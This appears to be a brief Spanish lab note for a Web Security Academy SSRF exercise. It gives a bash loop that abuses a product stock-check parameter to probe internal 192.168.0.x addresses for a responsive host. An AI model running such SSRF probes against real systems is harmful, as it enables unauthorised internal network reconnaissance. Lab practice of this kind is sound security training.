
- encontrar la IP vulnerable
```
for i in {119..255} ; do echo "hola: 192.168.0.$i" && curl -s -i -X POST https://0a1a003604b85b1c825b6f43000300b8.web-security-academy.net/product/stock -d "stockApi=http%3A%2F%2F192.168.0.$i%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1"  | grep HTTP | grep -v 500  ; done
```